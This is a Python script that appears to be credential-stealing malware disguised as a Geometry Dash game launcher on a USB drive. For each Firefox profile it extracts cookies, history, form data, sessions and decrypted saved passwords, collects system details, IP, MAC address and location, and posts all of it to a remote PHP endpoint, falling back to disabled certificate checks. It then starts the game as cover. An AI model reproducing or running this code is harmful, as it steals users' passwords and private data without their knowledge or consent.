# https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py
# https://github.com/Busindre/dumpzilla/blob/master/dumpzilla.py

from collections import namedtuple
import json, getpass, os, warnings, sys, requests, platform, socket, psutil, uuid, datetime#, subprocess, threading, time, ctypes, shutil, multiprocessing
from screeninfo import get_monitors
from geopy.geocoders import Nominatim
from datetime import datetime
#import tkinter as tk
#from PIL import Image, ImageTk
#from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
#from comtypes import CLSCTX_ALL
#from pydub import AudioSegment
#from pydub.playback import play
#from comtypes import CoInitialize, CoUninitialize

# Ne pas afficher les messages d'attention.
warnings.filterwarnings("ignore")
old_input = input
def _input(*args, **kwargs):
    try:
        return old_input(*args, **kwargs)
    except KeyboardInterrupt:
        sys.exit()
input = _input

# That is a patch for Nuitka to not detect the "import" line and instead use the "from" line, because if it does, Nuitka will crash for no reason. Time loss due to that stupid bug: 30 minutes
try:
    from . import dumpzilla, decrypt  # this works in Nuitka but not in Python
except:
    exec("i-m-p-o-r-t d-u-m-p-z-i-l-l-a, d-e-c-r-y-p-t".replace("-", ""))  # this works in Python but not in Nuitka

# Pour si on démarre GD
startGD = True

user = getpass.getuser()
mozilla_profile_dir = "C:\\Users\\" + user + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
url = 'https://project-sharing.fr.to/TEST/recevoir.php'
geolocator = Nominatim(user_agent="geoapi")
location = geolocator.geocode("Paris, France")
date_time = datetime.now().strftime("%d-%m-%Y-%Hh%Ms%S")

for i in os.listdir(mozilla_profile_dir):
    mozilla_profile = os.path.join(mozilla_profile_dir, i)
    dump = dumpzilla.Dumpzilla()
    Tuple = namedtuple("Tuple", [
        "is_help_ok",
        "is_cookie_ok",
        "showdom",
        "domain",
        "name",
        "hostcookie",
        "access",
        "create",
        "secure",
        "httponly",
        "last_range",
        "create_range",
        "is_permissions_ok",
        "host",
        "type",
        "modif",
        "modif_range",
        "is_downloads_ok",
        "range",
        "is_forms_ok",
        "value",
        "forms_range",
        "is_history_ok",
        "url",
        "title",
        "date",
        "history_range",
        "is_bookmarks_ok",
        "bm_last_range",
        "bm_create_range",
        "is_cacheoff_ok",
        "cache_range",
        "extract",
        "is_keypinning_ok",
        "entry_type",
        "is_thump_ok",
        "extract_thumb",
        "Verbosity",
        "is_watch_ok",
        "text",
        "is_regexp_ok",
        "is_preferences_ok",
        "is_addon_ok",
        "is_search_ok",
        "is_passwords_ok",
        "is_cert_ok",
        "is_session_ok",
        "is_live_ok",
        "is_summary_ok",
        "is_frequency_ok",
        "Export",
        "PROFILE_DIR"
    ])

    t = Tuple(False,  # is_help_ok (bool)
        True,   # is_cookie_ok (bool)
        True,   # showdom (bool)
        [],     # domain (list)
        [],     # name (list)
        [],     # hostcookie (list)
        [],     # access (list)
        [],     # create (list)
        [],     # secure (list, could be number or string)
        [],     # httponly (list, could be number or string)
        [],     # last_range (list)
        [],     # create_range (list)
        True,   # is_permissions_ok (bool)
        [],     # host (list)
        [],     # type (list)
        [],     # modif (list)
        [],     # modif_range (list)
        True,   # is_downloads_ok (bool)
        [],     # range (list)
        True,   # is_forms_ok (bool)
        [],     # value (list)
        [],     # forms_range (list)
        True,   # is_history_ok (bool)
        [],     # url (list)
        [],     # title (list)
        [],     # date (list)
        [],     # history_range (list)
        True,   # is_bookmarks_ok (bool)
        [],     # bm_last_range (list)
        [],     # bm_create_range (list)
        True,   # is_cacheoff_ok (bool)
        [],     # cache_range (list)
        [],     # extract (list)
        True,   # is_keypinning_ok (bool)
        [],     # entry_type (list)
        True,   # is_thump_ok (bool)
        [],     # extract_thumb (list)
        [],     # Verbosity (list)
        True,   # is_watch_ok (bool)
        [],     # text (list)
        True,   # is_regexp_ok (bool)
        True,   # is_preferences_ok (bool)
        True,   # is_addon_ok (bool)
        True,   # is_search_ok (bool)
        True,   # is_passwords_ok (bool)
        True,   # is_cert_ok (bool)
        True,   # is_session_ok (bool)
        True,   # is_live_ok (bool)
        True,   # is_summary_ok (bool)
        True,   # is_frequency_ok
        [],     # Export (list)
        mozilla_profile # PROFILE_DIR
    )

    dump.args = t

    dump.init()

    dump.show_cookies(mozilla_profile)
    dump.show_preferences(mozilla_profile)
    dump.show_addons(mozilla_profile)
    dump.show_extensions(mozilla_profile)
    dump.show_info_addons(mozilla_profile)
    dump.show_search_engines(mozilla_profile)
    dump.show_downloads(mozilla_profile)
    dump.show_downloads_history(mozilla_profile)
    dump.show_downloadsdir(mozilla_profile)
    dump.show_forms(mozilla_profile)
    dump.show_history(mozilla_profile)
    dump.show_bookmarks(mozilla_profile)
    dump.show_passwords(mozilla_profile)
    dump.show_cache(mozilla_profile)
    dump.show_key_pinning(mozilla_profile)
    dump.show_cert_override(mozilla_profile)
    dump.show_session(mozilla_profile)

    try:
        moz = decrypt.MozillaInteraction(False)
        moz.load_profile(mozilla_profile)
        moz.authenticate(False)
        outputs = moz.decrypt_passwords()
        dump.total_extraction["passwords"] = outputs
        moz.unload_profile()
    except Exception as e:
        pass

    try:
        response = requests.post(url, data={"data": json.dumps(dump.total_extraction), "title_file": f"report_{user}_{i}", "folder_name": user + "_" + date_time})
    except Exception as e:
        response = requests.post(url, data={"data": json.dumps(dump.total_extraction), "title_file": f"report_{user}_{i}", "folder_name": user + "_" + date_time}, verify=False)

info = {
    "Utilisateur": user,
    "Nom de l'ordinateur": platform.node(),
    "Systeme d'exploitation": platform.system(),
    "Version OS": platform.version(),
    "Architecture": platform.architecture()[0],
    "Processeur": platform.processor(),
    "Nombre de coeurs": psutil.cpu_count(logical=False),
    "Nombre de threads": psutil.cpu_count(logical=True),
    "Memoire RAM totale": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
    "Adresse IP": socket.gethostbyname(socket.gethostname()),
    "Adresse MAC": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1]),
    "Ecran(s)": [f"{m.width}x{m.height}" for m in get_monitors()],
    "Date et heure actuelles": date_time,
    "Adresse complète": location.address,
    "Latitude": location.latitude,
    "Longitude": location.longitude,
}

try:
    response = requests.post(url, data={"infos": json.dumps(info), "title_file_infos": f"{user}_info", "folder_name_infos": user + "_" + date_time})
except Exception as e:
    response = requests.post(url, data={"infos": json.dumps(info), "title_file_infos": f"{user}_info", "folder_name_infos": user + "_" + date_time}, verify=False)


if startGD:
    usb_drives = []
    partitions = psutil.disk_partitions(all=True)

    for partition in partitions:
        if "removable" in partition.opts:
            usb_drives.append(partition.device.replace(":\\", ""))

    for drive in usb_drives:
        gd_loc = f"{drive}:\\jeux\\GeometryDash"
        if os.path.isdir(gd_loc):
            break

    if os.path.isdir(gd_loc):  # Vérifie si le dossier existe
        exe_path = os.path.join(gd_loc, "maingame.exe")  # Chemin complet du .exe
        if os.path.isfile(exe_path):  # Vérifie si l'exécutable existe
            os.chdir(gd_loc)
            os.startfile(exe_path)
